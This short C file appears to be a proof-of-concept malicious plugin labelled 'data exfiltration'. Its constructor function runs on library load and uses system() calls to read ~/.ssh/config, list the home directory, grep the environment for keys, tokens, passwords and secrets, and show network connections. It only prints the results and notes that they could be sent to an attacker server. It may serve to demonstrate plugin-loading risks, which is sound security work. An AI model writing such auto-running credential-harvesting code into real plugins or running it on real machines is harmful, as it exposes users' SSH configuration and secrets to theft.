// More sophisticated attack: data exfiltration
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

__attribute__((constructor))
static void exfiltrate(void) {
    fprintf(stderr, "\n[ATTACK] Exfiltration plugin loaded\n");

    // Attempt to read sensitive files
    fprintf(stderr, "[ATTACK] Attempting to read ~/.ssh/config:\n");
    system("cat ~/.ssh/config 2>/dev/null | head -5 || echo '(file not found)'");

    fprintf(stderr, "\n[ATTACK] Listing home directory files:\n");
    system("ls -la ~ 2>/dev/null | head -10");

    fprintf(stderr, "\n[ATTACK] Searching for API keys/tokens:\n");
    system("env | grep -iE '(key|token|password|secret)' | head -5 || echo '(none found in env)'");

    fprintf(stderr, "\n[ATTACK] Network connections:\n");
    system("netstat -an 2>/dev/null | head -10 || lsof -i 2>/dev/null | head -10 || echo '(could not check)'");

    fprintf(stderr, "\n[ATTACK] This data could be sent to attacker server\n");
}
